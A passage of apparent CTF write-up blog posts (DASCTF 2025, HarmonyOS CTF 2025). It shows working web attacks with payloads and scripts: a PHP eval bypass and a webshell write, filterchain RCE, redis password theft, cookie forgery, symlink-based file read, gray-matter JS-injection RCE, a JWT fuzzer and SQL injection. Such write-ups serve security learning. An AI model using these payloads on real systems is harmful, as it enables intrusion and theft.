[{"content":"DASCTF2025wp phpms git泄露用githackerh恢复后，用git log恢复历史版本\n得到index.php\n1 2 3 4 5 6 7 8 \u0026lt;?php $shell = $_GET[\u0026#39;shell\u0026#39;]; if(preg_match(\u0026#39;/\\x0a|\\x0d/\u0026#39;,$shell)){ echo \u0026#39;:(\u0026#39;; }else{ eval(\u0026#34;#$shell\u0026#34;); } ?\u0026gt; 然后shell传参，eval禁用了所有php函数，#通过?\u0026gt;\u0026lt;?的形式绕过\n打原生类列出目录\n1 index.php?shell=?\u0026gt;\u0026lt;?php $d=new GlobIterator(\u0026#39;/*\u0026#39;);foreach($d as $f){echo $f-\u0026gt;getPathname().\u0026#39;\u0026lt;br\u0026gt;\u0026#39;;}?\u0026gt; 根目录下有个hintflag\n然后web目录下还有no_careee.php\n这里打SplFileObject原生类读文件，但是hintflag权限不够\n1 ?shell=?\u0026gt;\u0026lt;?php $f=new SplFileObject(\u0026#39;/etc/passwd\u0026#39;);echo $f-\u0026gt;fread($f-\u0026gt;getSize());?\u0026gt; 直接读no_careee.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php function block_if_dangerous_code($input) { // 定义正则：匹配函数名，忽略大小写，捕获具体匹配内容 if (preg_match(\u0026#39;/\\b(eval|include|include_once|require|require_once)\\b/i\u0026#39;, $input, $match)) { $matched_func = $match[1]; // 捕获到的函数名 echo \u0026#34;\u0026lt;br /\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;b\u0026gt;Warning\u0026lt;/b\u0026gt;: {$matched_func} has been disabled for security reasons in \u0026lt;b\u0026gt;/var/www/html/index.php(6) : eval()\u0026#39;d code\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;1\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#34;; exit; } } // 检查 GET 参数 shell if (isset($_GET[\u0026#39;shell\u0026#39;])) { block_if_dangerous_code($_GET[\u0026#39;shell\u0026#39;]); } ?\u0026gt; 确实禁用所有函数\n可以fwrite写文件\n1 ?shell=?\u0026gt;\u0026lt;?php $f=new SplFileObject(\u0026#39;/tmp/shell.php\u0026#39;,\u0026#39;w\u0026#39;);$f-\u0026gt;fwrite(\u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39;);?\u0026gt; 读 /proc/self/maps 和 libc-2.31.so 打 filterchain rce\n1 2 maps_path = \u0026#39;./maps\u0026#39; cmd = \u0026#34;echo \u0026#39;\u0026lt;?php eval($_POST[1]);\u0026#39;\u0026gt;/var/www/html/1.php\u0026#34; 当前目录不可写，写到tmp目录下面\ncmd改成ps -ef看进程\n发现root起了redis服务,读取/etc/redis.conf 看密码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ################################## SECURITY ################################### # Require clients to issue AUTH \u0026lt;PASSWORD\u0026gt; before processing any other # commands. This might be useful in environments in which you do not trust # others with access to the host running redis-server. # # This should stay commented out for backward compatibility and because most # people do not need auth (e.g. they run their own servers). # # Warning: since Redis is pretty fast an outside user can try up to # 150k passwords per second against a good box. This means that you should # use a very strong password otherwise it will be very easy to break. # requirepass admin123 构造redis命令读数据库\n1 2 redis-cli -a admin123 KEYS \u0026#34;*\u0026#34; \u0026gt; /tmp/5.txt redis-cli -a admin123 GET \u0026#34;flag\u0026#34; \u0026gt; /tmp/5.txt ","date":"2025-06-24T00:00:00Z","image":"https://0d000721999.github.io/p/2025dasctfwp/1.png","permalink":"https://0d000721999.github.io/p/2025dasctfwp/","title":"2025DASCTFwp"},{"content":"2025鸿蒙ctfwp Layers of Compromise 弱口令user/password123登入\ncookie改admin登入\nconfidential_note.txt\n1 2 内部API令牌: c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec confidential_dev.txt\n1 2 3 4 5 6 内部API端点: - status - config - debug (仅限本地访问) 查看 /data/app/www/secrettttts/ 获取开发令牌。 访问secrettttts/token.txt\n1 2 3 4 5 6 7 8 9 10 11 7f8a1a4b3c7d9e6f2b5s8d7f9g6h5j4k3l2m1n --auth.php if (isset($_COOKIE[\u0026#39;auth_token\u0026#39;])) { $auth_data = unserialize(base64_decode($_COOKIE[\u0026#39;auth_token\u0026#39;])); if ($auth_data[\u0026#39;username\u0026#39;] === \u0026#39;dev\u0026#39; \u0026amp;\u0026amp; $auth_data[\u0026#39;hash\u0026#39;] === md5(\u0026#39;dev\u0026#39; . $CONFIG[\u0026#39;auth_key\u0026#39;])) { return true; } } -- \u0026#39;username\u0026#39;=\u0026gt;\u0026#39;dev\u0026#39; \u0026#39;auth_key\u0026#39; =\u0026gt; \u0026#39;S3cr3tK3y!2023\u0026#39; 伪造token\nExp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php // 配置信息 $CONFIG = [ \u0026#39;auth_key\u0026#39; =\u0026gt; \u0026#39;S3cr3tK3y!2023\u0026#39; ]; // 创建认证数据数组 $auth_data = [ \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;dev\u0026#39;, \u0026#39;hash\u0026#39; =\u0026gt; md5(\u0026#39;dev\u0026#39; . $CONFIG[\u0026#39;auth_key\u0026#39;]) ]; // 序列化并编码 $serialized = serialize($auth_data); $cookie_value = base64_encode($serialized); // 输出结果 echo \u0026#34;生成的 auth_token Cookie 值为:\\n\u0026#34;; echo $cookie_value . \u0026#34;\\n\\n\u0026#34;; ?\u0026gt; auth_token=YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ== cat，more,less都被过滤了，用nl\nFilesystem 下载源码\nadmin.controller.ts里面\n1 const configFile = \u0026#34;/opt/filesystem/adminconfig.lock\u0026#34; 这条未知，还有app.module.ts里面\n1 2 3 4 5 6 7 @Module({ imports: [JwtModule.register({ secret: \u0026#39;xxxxxxxxxxxxxx\u0026#39;, signOptions: { expiresIn: \u0026#39;7d\u0026#39; } }), secret未知，看到index界面可以文件上传和下载，想到任意文件下载，但是过滤了./\n上传文件支持zip，tar想到上传软链接然后下载进行任意文件读取\n1 2 ln -s / malicious zip --symlinks payload.zip malicious zip好像不行，用tar\n1 2 ln -s / malicious tar -cvf 1.tar malicious 指向根目录后，任意文件读取，参考前面web1的路径读取\n1 download?filename=upload_1749308551054/malicious/data/app/src/app.module.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { Module } from \u0026#39;@nestjs/common\u0026#39;; import { AppController } from \u0026#39;./app.controller\u0026#39;; import { AppService } from \u0026#39;./app.service\u0026#39;; import {AdminController} from \u0026#34;./admin.controller\u0026#34;; import {JwtModule} from \u0026#34;@nestjs/jwt\u0026#34;; // import { SessionModule } from \u0026#39;@nestjs-plus/sessions\u0026#39;; import * as cookieParser from \u0026#39;cookie-parser\u0026#39;; import {MulterModule} from \u0026#34;@nestjs/platform-express\u0026#34;; @Module({ imports: [JwtModule.register({ secret: \u0026#39;sec_y0u_nnnnever_know\u0026#39;, signOptions: { expiresIn: \u0026#39;7d\u0026#39; } }), MulterModule.register({ dest: \u0026#39;/opt/uploads\u0026#39;, })], controllers: [AppController, AdminController,], providers: [AppService], }) export class AppModule {} 读到secret: 'sec_y0u_nnnnever_know'\n1 download?filename=upload_1749308551054/malicious/data/opt/filesystem/adminconfig.lock 1 2 3 4 { \u0026#34;password\u0026#34;: \u0026#34;hArd_Pa@s5_wd\u0026#34;, \u0026#34;slogon\u0026#34;: \u0026#34;Keep it up!\u0026#34; } 然后/admin/login路由登入\n获得jwt令牌，回去看源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 renderAdmin(req, res) { console.log(req.cookies); const token = req.cookies.token; if (!token) { return res.status(401).json({ message: \u0026#39;未授权\u0026#39; }); } try { const decoded = this.jwtService.verify(token); const profile = gray.stringify(gray(decoded.slogon).content, { username: decoded.username }); console.log(profile); res.render(\u0026#39;admin\u0026#39;, { \u0026#34;info\u0026#34;: profile }); } catch (error) { return res.status(401).json({ message: \u0026#39;无效的令牌\u0026#39; }); } } 直接在jwt里面的slogon注入js代码看看能不能rce,参考https://github.com/simonhaenisch/md-to-pdf/issues/99\n1 ---js\\n((require(\\\u0026#34;child_process\\\u0026#34;)).execSync(\\\u0026#34;ls\\\u0026#34;))\\n---RCE 后面靶机炸了，换了好几次才搞出来\n无回显考虑写文件到uploads目录下读取,byd那个jwt官网有问题\n然后用前下任意文件读取来读\n读到flag文件夹下的f1aGG313.txt文件\n1 ---js\\n((require(\\\u0026#34;child_process\\\u0026#34;)).execSync(\\\u0026#34;cat ../flag/f1aGG313.txt \u0026gt; /data/opt/uploads/1.txt\\\u0026#34;))\\n---RCE ezAPP_And_SERVER 下载附件是hap文件，改zip解压找abc文件，进jadx反编译\n看到utils类的信息，很多混淆的信息丢给ai分析\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 def xor_decode(text: str, key: str = \u0026#34;134522123\u0026#34;) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34; 使用XOR运算解码文本 参数: text: 要解码的文本 key: 解码密钥 返回: 解码后的字符串 \u0026#34;\u0026#34;\u0026#34; return \u0026#34;\u0026#34;.join( chr(ord(char) ^ ord(key[i % len(key)])) for i, char in enumerate(text) ) def main(): # 编码的API路径 encoded_paths = { \u0026#34;api_user_uuid\u0026#34;: \u0026#34;\\u001eRD\\\\\\u001dD\\u0000\\u001dP^]@TQFB\\rFXW\\t\u0026#34;, \u0026#34;api_user_verify\u0026#34;: \u0026#34;\\u001eRD\\\\\\u001dD\\u0000\\u001dTTGRYSU\u0026#34; } print(\u0026#34;解码API路径:\u0026#34;) for name, encoded in encoded_paths.items(): decoded = xor_decode(encoded) print(f\u0026#34;{name}: {encoded!r} -\u0026gt; {decoded!r}\u0026#34;) # 解码密钥 secret = \u0026#34;FpBz\\u0001ecH\\n\\u001bEzx\\u0017@|SrAXQGkloXz\\u0007ElXZ\u0026#34; decoded_secret = xor_decode(secret) print(f\u0026#34;\\n密钥: {decoded_secret!r}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() 1 2 3 4 5 解码API路径: api_user_uuid: \u0026#39;\\x1eRD\\\\\\x1dD\\x00\\x1dP^]@TQFB\\rFXW\\t\u0026#39; -\u0026gt; \u0026#39;/api/v1/contacts?uid=\u0026#39; api_user_verify: \u0026#39;\\x1eRD\\\\\\x1dD\\x00\\x1dTTGRYSU\u0026#39; -\u0026gt; \u0026#39;/api/v1/getflag\u0026#39; 密钥: \u0026#39;wCvO3WRz9*vNM%rMaApkerY^^jI6vXmh\u0026#39; Userlist类里面找到一堆uid\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 obj3.__username = ObservedPropertySimplePU(\u0026#34;\u0026#34;, obj3, \u0026#34;username\u0026#34;); r24 = [Object]; r24[0] = createobjectwithbuffer([\u0026#34;uid\u0026#34;, \u0026#34;f47ac10b-58cc-4372-a567-0e02b2c3d479\u0026#34;]); r24[1] = createobjectwithbuffer([\u0026#34;uid\u0026#34;, \u0026#34;c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b\u0026#34;]); r24[2] = createobjectwithbuffer([\u0026#34;uid\u0026#34;, \u0026#34;732390b8-ccb6-41de-a93b-94ea059fd263\u0026#34;]); r24[3] = createobjectwithbuffer([\u0026#34;uid\u0026#34;, \u0026#34;f633ec24-cfe6-42ba-bcd8-ad2dfae6d547\u0026#34;]); r24[4] = createobjectwithbuffer([\u0026#34;uid\u0026#34;, \u0026#34;eb8991c8-9b6f-4bc8-89dd-af3576e92bdb\u0026#34;]); r24[5] = createobjectwithbuffer([\u0026#34;uid\u0026#34;, \u0026#34;db62356d-3b99-4764-b378-e46cb95df9e6\u0026#34;]); r24[6] = createobjectwithbuffer([\u0026#34;uid\u0026#34;, \u0026#34;8f4610ee-ee87-4cca-ad92-6cac4fdbe722\u0026#34;]); r24[7] = createobjectwithbuffer([\u0026#34;uid\u0026#34;, \u0026#34;1678d80e-fd4d-4de3-aae2-cb0077f10c21\u0026#34;]); obj3.userList = r24; obj3.setInitiallyProvidedValue(arg1); obj3.finalizeConstruction(); return obj3; 前面看出有jwt，写脚本爆破jwt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 import requests import jwt import time from typing import Dict, List class JWTFuzzer: def __init__(self): self.target_url = \u0026#34;http://web-9c9e5f5823.challenge.xctf.org.cn\u0026#34; self.secret = self._xor_decode(\u0026#34;FpBz\\u0001ecH\\n\\u001bEzx\\u0017@|SrAXQGkloXz\\u0007ElXZ\u0026#34;) self.test_uid = \u0026#34;c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b\u0026#34; self.all_tokens = [] # 存储所有生成的JWT @staticmethod def _xor_decode(text: str, key: str = \u0026#34;134522123\u0026#34;) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;XOR解码工具方法\u0026#34;\u0026#34;\u0026#34; return \u0026#34;\u0026#34;.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text)) def _generate_jwt(self, payload: Dict, algorithm: str = \u0026#34;HS256\u0026#34;, name: str = \u0026#34;\u0026#34;) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;生成JWT令牌并保存到列表\u0026#34;\u0026#34;\u0026#34; token = jwt.encode(payload, self.secret, algorithm=algorithm) self.all_tokens.append({ \u0026#34;name\u0026#34;: name, # 添加name字段 \u0026#34;token\u0026#34;: token, \u0026#34;payload\u0026#34;: payload, \u0026#34;algorithm\u0026#34;: algorithm }) return token def _test_endpoint(self, token: str, config_name: str) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34;测试API端点并保留完整响应\u0026#34;\u0026#34;\u0026#34; headers = { \u0026#34;Authorization\u0026#34;: f\u0026#34;Bearer {token}\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;JWTFuzzer/1.0\u0026#34; } try: # 测试GET请求 response = requests.get( f\u0026#34;{self.target_url}/api/v1/getflag\u0026#34;, headers=headers, timeout=10 ) print(f\u0026#34;[{config_name}] GET -\u0026gt; {response.status_code}\u0026#34;) print(f\u0026#34;Response: {response.text}\u0026#34;) # 测试POST请求 post_data = {\u0026#34;uid\u0026#34;: self.test_uid} post_response = requests.post( f\u0026#34;{self.target_url}/api/v1/getflag\u0026#34;, headers=headers, json=post_data, timeout=10 ) print(f\u0026#34;[{config_name}] POST -\u0026gt; {post_response.status_code}\u0026#34;) print(f\u0026#34;Response: {post_response.text}\u0026#34;) except Exception as e: print(f\u0026#34;[{config_name}] Request Failed: {str(e)}\u0026#34;) def generate_jwt_variations(self) -\u0026gt; List[Dict]: \u0026#34;\u0026#34;\u0026#34;生成各种JWT变体\u0026#34;\u0026#34;\u0026#34; test_cases = [ # 基础测试 { \u0026#34;name\u0026#34;: \u0026#34;Basic JWT\u0026#34;, \u0026#34;payload\u0026#34;: {\u0026#34;uid\u0026#34;: self.test_uid}, \u0026#34;algorithm\u0026#34;: \u0026#34;HS256\u0026#34; }, # 带时间戳 { \u0026#34;name\u0026#34;: \u0026#34;With Timestamp\u0026#34;, \u0026#34;payload\u0026#34;: {\u0026#34;uid\u0026#34;: self.test_uid, \u0026#34;iat\u0026#34;: int(time.time())}, \u0026#34;algorithm\u0026#34;: \u0026#34;HS256\u0026#34; }, # 管理员权限 { \u0026#34;name\u0026#34;: \u0026#34;Admin Role\u0026#34;, \u0026#34;payload\u0026#34;: {\u0026#34;uid\u0026#34;: self.test_uid, \u0026#34;role\u0026#34;: \u0026#34;admin\u0026#34;}, \u0026#34;algorithm\u0026#34;: \u0026#34;HS256\u0026#34; }, # 过期时间 { \u0026#34;name\u0026#34;: \u0026#34;With Expiration\u0026#34;, \u0026#34;payload\u0026#34;: { \u0026#34;uid\u0026#34;: self.test_uid, \u0026#34;iat\u0026#34;: int(time.time()), \u0026#34;exp\u0026#34;: int(time.time()) + 3600 }, \u0026#34;algorithm\u0026#34;: \u0026#34;HS256\u0026#34; }, # 不同算法 { \u0026#34;name\u0026#34;: \u0026#34;HS512 Algorithm\u0026#34;, \u0026#34;payload\u0026#34;: {\u0026#34;uid\u0026#34;: self.test_uid}, \u0026#34;algorithm\u0026#34;: \u0026#34;HS512\u0026#34; }, # 空声明 { \u0026#34;name\u0026#34;: \u0026#34;Empty Claims\u0026#34;, \u0026#34;payload\u0026#34;: {}, \u0026#34;algorithm\u0026#34;: \u0026#34;HS256\u0026#34; }, # 额外字段 { \u0026#34;name\u0026#34;: \u0026#34;Extra Fields\u0026#34;, \u0026#34;payload\u0026#34;: {\u0026#34;uid\u0026#34;: self.test_uid, \u0026#34;is_admin\u0026#34;: True, \u0026#34;debug\u0026#34;: True}, \u0026#34;algorithm\u0026#34;: \u0026#34;HS256\u0026#34; } ] print(f\u0026#34;\\n🔧 Generating {len(test_cases)} JWT variations\u0026#34;) for case in test_cases: try: token = self._generate_jwt( payload=case[\u0026#34;payload\u0026#34;], algorithm=case[\u0026#34;algorithm\u0026#34;], name=case[\u0026#34;name\u0026#34;] # 传递name参数 ) print(f\u0026#34;[{case[\u0026#39;name\u0026#39;]}] Generated JWT: {token}\u0026#34;) self._test_endpoint(token, case[\u0026#34;name\u0026#34;]) except Exception as e: print(f\u0026#34;[{case[\u0026#39;name\u0026#39;]}] JWT Generation Failed: {str(e)}\u0026#34;) return self.all_tokens def run(self) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34;运行完整的JWT模糊测试\u0026#34;\u0026#34;\u0026#34; print(\u0026#34;🚀 Starting JWT Fuzzer\u0026#34;) print(f\u0026#34;🎯 Target: {self.target_url}\u0026#34;) print(f\u0026#34;🔑 Secret: {self.secret}\u0026#34;) print(f\u0026#34;🆔 Test UID: {self.test_uid}\u0026#34;) print(\u0026#34;=\u0026#34; * 60) # 生成并测试所有JWT变体 tokens = self.generate_jwt_variations() # 输出所有生成的JWT print(\u0026#34;\\n📜 All Generated JWTs:\u0026#34;) for i, token_info in enumerate(tokens, 1): print(f\u0026#34;\\n[{i}] {token_info[\u0026#39;name\u0026#39;]}\u0026#34;) print(f\u0026#34;Algorithm: {token_info[\u0026#39;algorithm\u0026#39;]}\u0026#34;) print(f\u0026#34;Payload: {token_info[\u0026#39;payload\u0026#39;]}\u0026#34;) print(f\u0026#34;Token: {token_info[\u0026#39;token\u0026#39;]}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: fuzzer = JWTFuzzer() fuzzer.run() 随便拿一个测试\n发现这里uid可以sql注入，直接测试1=1就爆出admin的uid\n1 {\u0026#34;data\u0026#34;:{\u0026#34;users\u0026#34;:[{\u0026#34;uuid\u0026#34;:\u0026#34;9d5ec98c-5848-4450-9e58-9f97b6b3b7bc\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;phone\u0026#34;:\u0026#34;123-456-7890\u0026#34;},{\u0026#34;uuid\u0026#34;:\u0026#34;f47ac10b-58cc-4372-a567-0e02b2c3d479\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Bob\u0026#34;,\u0026#34;phone\u0026#34;:\u0026#34;987-654-3210\u0026#34;},{\u0026#34;uuid\u0026#34;:\u0026#34;c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Charlie\u0026#34;,\u0026#34;phone\u0026#34;:\u0026#34;555-555-5555\u0026#34;},{\u0026#34;uuid\u0026#34;:\u0026#34;732390b8-ccb6-41de-a93b-94ea059fd263\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;David\u0026#34;,\u0026#34;phone\u0026#34;:\u0026#34;444-444-4444\u0026#34;},{\u0026#34;uuid\u0026#34;:\u0026#34;f633ec24-cfe6-42ba-bcd8-ad2dfae6d547\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Eve\u0026#34;,\u0026#34;phone\u0026#34;:\u0026#34;333-333-3333\u0026#34;},{\u0026#34;uuid\u0026#34;:\u0026#34;eb8991c8-9b6f-4bc8-89dd-af3576e92bdb\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Frank\u0026#34;,\u0026#34;phone\u0026#34;:\u0026#34;222-222-2222\u0026#34;},{\u0026#34;uuid\u0026#34;:\u0026#34;db62356d-3b99-4764-b378-e46cb95df9e6\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Grace\u0026#34;,\u0026#34;phone\u0026#34;:\u0026#34;111-111-1111\u0026#34;},{\u0026#34;uuid\u0026#34;:\u0026#34;8f4610ee-ee87-4cca-ad92-6cac4fdbe722\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Hannah\u0026#34;,\u0026#34;phone\u0026#34;:\u0026#34;000-000-0000\u0026#34;},{\u0026#34;uuid\u0026#34;:\u0026#34;1678d80e-fd4d-4de3-aae2-cb0077f10c21\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Ian\u0026#34;,\u0026#34;phone\u0026#34;:\u0026#34;123-123-1234\u0026#34;},{\u0026#34;uuid\u0026#34;:\u0026#34;5845b71f-ebb6-4707-8199-a4e46acf351f\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Jack\u0026#34;,\u0026#34;phone\u0026#34;:\u0026#34;456-456-4567\u0026#34;}]}} 回到前下的源码找到X-Sign\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public Object #~@0\u0026lt;@4*#(Object functionObject, Object newTarget, utils this, Object arg0) { i = \u0026#34;{\\\u0026#34;data\\\u0026#34;:\\\u0026#34;\u0026#34; + arg0 + \u0026#34;\\\u0026#34;}\u0026#34;; ldlexvar = _lexenv_0_0_; obj = ldlexvar.request; ldlexvar2 = _lexenv_0_1_; obj2 = createobjectwithbuffer([\u0026#34;method\u0026#34;, 0, \u0026#34;extraData\u0026#34;, 0, \u0026#34;header\u0026#34;, 0]); obj2.method = import { default as http } from \u0026#34;@ohos:net.http\u0026#34;.RequestMethod.POST; obj2.extraData = i; obj3 = createobjectwithbuffer([\u0026#34;Authorization\u0026#34;, 0, \u0026#34;X-Sign\u0026#34;, 0, \u0026#34;Accept\u0026#34;, \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/ apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;]); ldlexvar3 = _lexenv_1_0_; obj4 = ldlexvar3.o0OO00O; ldlexvar4 = _lexenv_0_2_; ldlexvar5 = _lexenv_1_0_; obj3.Authorization = obj4(ldlexvar4, ldlexvar5.oo0Oo0(_lexenv_1_0_.Secret)); CryptoJS = import { default as CryptoJS } from \u0026#34;@normalized:N\u0026amp;\u0026amp;\u0026amp;@ohos/crypto-js/index\u0026amp;2.0.0\u0026#34;; MD5 = CryptoJS.MD5(i); obj3.X-Sign = MD5.toString(); obj2.header = obj3; callthisN = obj(ldlexvar2, obj2); callthisN.then(#~@0\u0026lt;@4**#); return null; } 这里的X-sign逻辑是md5加密data请求体，前面还有部分混淆没解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def xor_decode(text: str, key: str = \u0026#34;134522123\u0026#34;) -\u0026gt; str: return \u0026#34;\u0026#34;.join( chr(ord(char) ^ ord(key[i % len(key)])) for i, char in enumerate(text) ) def main(): encoded = { \u0026#34;1\u0026#34;: \u0026#34;c`u\\u0007\\u0002\\u0006\\t\u0026#34;, \u0026#34;2\u0026#34;: \u0026#34;c`u\\u0007\\u0002\\u0006\\tNczpg\\u0004\u0026#34;, \u0026#34;3\u0026#34;: \u0026#34;W_UR\u0026#34;, \u0026#34;4\u0026#34;: \u0026#34;|z}w{Xp|qVXE]Y[v\\u000bD\\u0001qudwtps|rre\\rs\\u007fx{qrT\\u007fvscts\\u0005ykF\\u0004~a~J\\u0001@\\n\\u0003YaD\\u0001B\\u0004K9\\\\DFUH\\u001dyFDc[Fw\\u0006\\u0001guxsxaJ\\u0007h\\u0006]aGqGd[p[Dtd|\\u0002\\u0007\\u0001dXYG}RPsAB~\\u0005K@F|ZFYtW|\\u007f?A\\u0006~aG\\u0006cN}dKV^XVDl\\u0002j\\u0002\\u0005Cukxzzkkua\\u0005d^\\u001fRhP\\u0004jkFZe\\ruQwCUtYV~P~[DVVfc@@8y\\u0006@G\\u0000{Ea{{}ZeX\\\\xhCrYU~gaM~t\\u0000\\u0019^Fup\\u007fdF\\u0004q|`q\\u001bS@tAA\\u001cd\\u0006\\u001fzAB[\\u007ftpeSz`P_8\\n\\bfAL\\u000bykAt`Dl\\u0007W\\u0019\\u007fDExr@y|Sf\\u0003_HPd\\u0005jf`[k_[Y\\u001eY\\u0003\\u001aU\\u000b|tg\\u0005\\u0003fAgiEDAw@vdsD;x\\u001b\\\\|PrubUxe\\u0002\\u0005x\\u001eVv~\\u0000mrkzzww\\u0003d\\u007fXsBuur\\u0001_zb]G\\u0006\\u0004\\u000bu\\u0003PvzJ~EfdDs|cE\\u001eqp\\u0000@\u0026gt;aE{usbpq\u0026#34;, \u0026#34;5\u0026#34;: \u0026#34;J\\u0011UVF[^\\\\\\u0011\\u000b\\u0011SPFT]ST\\u0013N\u0026#34;, } print(\u0026#34;解码结果:\u0026#34;) for name, code in encoded.items(): decoded = xor_decode(code) print(f\u0026#34;{name}: {code!r} -\u0026gt; {decoded!r}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() 1 2 3 4 5 1: \u0026#39;c`u\\x07\\x02\\x06\\t\u0026#39; -\u0026gt; \u0026#39;RSA2048\u0026#39; 2: \u0026#39;c`u\\x07\\x02\\x06\\tNczpg\\x04\u0026#39; -\u0026gt; \u0026#39;RSA2048|PKCS1\u0026#39; 3: \u0026#39;W_UR\u0026#39; -\u0026gt; \u0026#39;flag\u0026#39; 4: \u0026#39;|z}w{Xp|qVXE]Y[v\\x0bD\\x01qudwtps|rre\\rs\\x7fx{qrT\\x7fvscts\\x05ykF\\x04~a~J\\x01@\\n\\x03YaD\\x01B\\x04K9\\\\DFUH\\x1dyFDc[Fw\\x06\\x01guxsxaJ\\x07h\\x06]aGqGd[p[Dtd|\\x02\\x07\\x01dXYG}RPsAB~\\x05K@F|ZFYtW|\\x7f?A\\x06~aG\\x06cN}dKV^XVDl\\x02j\\x02\\x05Cukxzzkkua\\x05d^\\x1fRhP\\x04jkFZe\\ruQwCUtYV~P~[DVVfc@@8y\\x06@G\\x00{Ea{{}ZeX\\\\xhCrYU~gaM~t\\x00\\x19^Fup\\x7fdF\\x04q|`q\\x1bS@tAA\\x1cd\\x06\\x1fzAB[\\x7ftpeSz`P_8\\n\\x08fAL\\x0bykAt`Dl\\x07W\\x19\\x7fDExr@y|Sf\\x03_HPd\\x05jf`[k_[Y\\x1eY\\x03\\x1aU\\x0b|tg\\x05\\x03fAgiEDAw@vdsD;x\\x1b\\\\|PrubUxe\\x02\\x05x\\x1eVv~\\x00mrkzzww\\x03d\\x7fXsBuur\\x01_zb]G\\x06\\x04\\x0bu\\x03PvzJ~EfdDs|cE\\x1eqp\\x00@\u0026gt;aE{usbpq\u0026#39; -\u0026gt; \u0026#39;MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z\\nhqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK\\ns4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur\\nH4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn\\n99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw\\nK/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s\\nTwIDAQAB\u0026#39; 5: \u0026#39;J\\x11UVF[^\\\\\\x11\\x0b\\x11SPFT]ST\\x13N\u0026#39; -\u0026gt; \u0026#39;{\u0026#34;action\u0026#34;:\u0026#34;getflag\u0026#34;}\u0026#39; RSA加密，直接搓脚本生成\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 import base64 from cryptography.hazmat.primitives import serialization from cryptography.hazmat.primitives.asymmetric import padding from cryptography.hazmat.backends import default_backend from typing import Optional class RSAEncryptor: \u0026#34;\u0026#34;\u0026#34;RSA加密工具类\u0026#34;\u0026#34;\u0026#34; def __init__(self, public_key_pem: str): \u0026#34;\u0026#34;\u0026#34; 初始化RSA加密器 参数: public_key_pem: 